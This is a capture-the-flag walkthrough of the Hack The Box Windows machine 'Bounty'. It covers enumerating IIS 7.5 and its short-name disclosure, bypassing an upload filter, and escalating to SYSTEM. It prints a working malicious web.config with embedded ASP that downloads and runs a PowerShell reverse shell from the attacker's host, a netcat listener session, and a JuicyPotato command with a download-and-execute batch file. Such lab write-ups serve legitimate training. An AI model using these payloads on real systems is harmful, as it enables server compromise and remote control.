Box: Windows
Level: Easy
Info: Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches.
### Index
1. Initial Nmap Enumeration
2. Initial request  findings
3. Tech Stack
4. Shortname files/folders/directories IIS Vulnerability with tilde character
5. Reverse Shell using web.config
6. SystemInfo



##### Initial Nmap enumeration
```
$ nmap -T4 --min-rate=1000 -p- -sC -sV -Pn 10.10.10.93
PORT   STATE SERVICE    VERSION
80/tcp open  tcpwrapped
```

```
$ nmap -p80 -sC -sV bounty.htb
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

##### Initial Request Finding
```
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Thu, 31 May 2018 03:46:26 GMT
Accept-Ranges: bytes
ETag: "20ba8ef391f8d31:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Fri, 09 Aug 2024 00:18:11 GMT
Connection: close
Content-Length: 630
```

##### Tech Stack
ASP.NET web application with a back IIS 7.5. Focus should be on file upload through the web as mentioned in the Box Info.

##### Web Application 

![](Pasted%20image%2020240808202358.png)

Gobuster Enum

```
$ gobuster dir -u http://bounty.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,html -b 404 -t 1               
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bounty.htb/
[+] Method:                  GET
[+] Threads:                 1
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200) [Size: 941]
```

#### Troubleshooting Accessing Web.Config

So while solving this box, I was stuck. You can see in the above gobuster result that I am only enumerating the file with the extension aspx and html. I was not enumerating directories. I should have. I perform the nmap scan using the following NSE script and got nothing.

```
$ sudo nmap -p80 -sV -sC -sS --script=http-iis-short-name-brute 10.10.10.93 
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Bit Weird. Now I dig up on HTB Forums and got a hint that I should look for IIS tilde character "~" vulnerability which is looking for a Short File Folder name disclosure.

---
#### Reminder 
When you deal with IIS, do check for the short file/folder name disclosure using [IIS Short Name Scanner](https://github.com/irsdl/IIS-ShortName-Scanner/tree/master/release) and under the release directory run the following command and identify the short names of directories and files. Following to that you can use more specific wordlists using Gobuster or Burp's Spider/Crawler to enumerate directories.

---

```
$ java -jar iis_shortname_scanner.jar 2 20 http://bounty.htb/
Scanning...
Testing request method: "OPTIONS" with magic part: "/~1/.rem" ...
Early result: the target is probably vulnerable.
Early result: identified letters in names > A,C,D,E,F,L,N,O,P,R,S,T,U,X
Early result: identified letters in extensions > A,C,P,S
Dir: ASPNET~1
Dir: UPLOAD~1
File: CSASPX~1.CS
File: TRANSF~1.ASP
[/] TRANSF~1.ASS
#IIS Short Name (8.3) Scanner version 2023.4 - scan initiated 2024/08/09 13:39:35
Target: http://bounty.htb/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/.rem
|_ Extra information:
  |_ Number of sent requests: 571
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 2
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ TRANSF~1.ASP
Finished in: 15 second(s)
```

Now I know that there is a directories with the name ASPNET~1 and UPLOAD~1. Let's run gobuster to enumerate directories starting with the word "UPLOAD".

```
$ gobuster dir -u http://bounty.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bounty.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/UploadedFiles        (Status: 301) [Size: 155] [--> http://bounty.htb/UploadedFiles/]
/uploadedFiles        (Status: 301) [Size: 155] [--> http://bounty.htb/uploadedFiles/]
/uploadedfiles        (Status: 301) [Size: 155] [--> http://bounty.htb/uploadedfiles/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
```

We got 301 response for the directory "UploadedFiles".  Earlier we also notice that there's a transfer.aspx file present on the server when we were enumerating the aspx and html file extension. So now we have following two things.
1. A place where we can upload the file
2. Possible directory/path where the file is going to upload and we can access it via web browser. 

Here's the transfer.aspx look like.
![](Pasted%20image%2020240809134908.png)

I tried to upload a simple .aspx shell and I got invalid file type message. So now I need to figure out the valid file type.
![](Pasted%20image%2020240809135021.png)

Running the Brup Intruder gives me some good valid file types that I can upload.
![](Pasted%20image%2020240809135108.png)

Sort it by Content-Length. Content Length for valid file type 1331 and for invalid filetype 1336. So I got couple of options. Let's try .config file. I found an interesting [GitHub repo](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/web.config) to prepare a web.config file with aspx code underneath of the file that will execute the aspx code and get me the reverse shell. But before I dive into it, I need to look at the web.config file. Here's my web.config file.

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.5/shell.ps1')")
%>
```

Look at the line where it says "shell.ps1". The same GitHub Repo contains the Invoke-PowerShellTcp.ps1 which I download and rename as shell.ps1. I changed the last line of that ps1 file to my ip.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.5 -Port 443
```

So what is happening here? I will upload the web.config file through the transfer.aspx. The file will be accessible using the URL http://bounty.htb/uploadedFiles/web.config following to that the web.cofig file will try to download the shell1.ps from my server. So I need to start the python web server on my end. As soon as I open web.config, I will notice the GET request on my server. Target will try to download the shell.ps1 from my server and execute. Once the execution completes, I will have my reverse shell.

```
──(ringbuffer㉿kali)-[~/Downloads/Bounty.htb]
└─$ python -m http.server 80                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.93 - - [09/Aug/2024 12:41:12] "GET /shell.ps1 HTTP/1.1" 200 -

```

10.10.10.93 is an IP address of Bounty.htb which perform the GET request on my python web server where the shell.ps1 is present. At this point, the netcat listener is running as well in the second tab.

```
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.93] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin
```


At this point, as tried in the previous boxes (devel, granny, Grandpa), the local_exploit_suggester did not show any of the exploits. Let's try out winPEAS.

#### System Info 

The following results were obtained after running winPEAS.bat on the target. The obtained shell was a powershell which has the script execution disabled. The user doesn't have a rights to enabled the script execution. Hence, I switched to cmd.exe and ran the .bat files.

```
Host Name:                 BOUNTY                                                                                                                       
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter                                                                                  
OS Version:                6.1.7600 N/A Build 7600   
Hotfix(s):                 N/A

"Microsoft Windows Server 2008 R2 Datacenter "          
   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)       
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys) 
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)              
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)           
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)             
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)          
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)               
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)             
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)          
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys) 
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)  
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)   
MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)   
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)             
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)  
MS04-020 patch is NOT installed 2K/SP4-POSIX)           
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)               
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)            
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)             
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)         
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)           
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)               
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)

PRIVILEGES INFORMATION  
----------------------  
Privilege NameDescription               State           
============================= ========================================= ========        
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled        
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled        
SeAuditPrivilege              Generate security audits                  Disabled        
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled         
SeImpersonatePrivilege        Impersonate a client after authentication Enabled         
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

You can also just print the privileges using "whoami /priv" command.

```
PS C:\Users\merlin\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Since the SeImpersonatePrivilege is Enabled, We have couple of options. We have discussed this options in Granny.HTB as well. For this box, we are going to try out JuicyPoteto exploit.

1. Download the Juicypoteto binary from [Link](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) 
2. Using Impacket-SmbServer transfer it to the target. Also, start the Python Web Server.
3. Download the [Nishang PowerShell script](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/Invoke-PowerShellTcp.ps1) from Here and change the last line with your IP and Port 4444. Place this on in the same directory where the SMB Server and Python Web Server is running.
4. Prepare a bat file on target machine with the following line
```
echo "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.5:80/Invoke-PowerShellTcp.ps1')" > shell.bat
```

5. Download the batch script onto the target box using the command below.
```
(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.5:80/shell.bat', 'C:\Users\merlin\Documents\shell.bat')
```

6. Check the [valid list of CLSID on this Link](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/) 
7. Start the Listener on port 4444
8. Run the exploit with the following command
```
./JuicyPotato.exe -l 4444 -p C:\Users\merlin\Documents\shell.bat -t * -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
```

9. You should get the SYSTEM shell.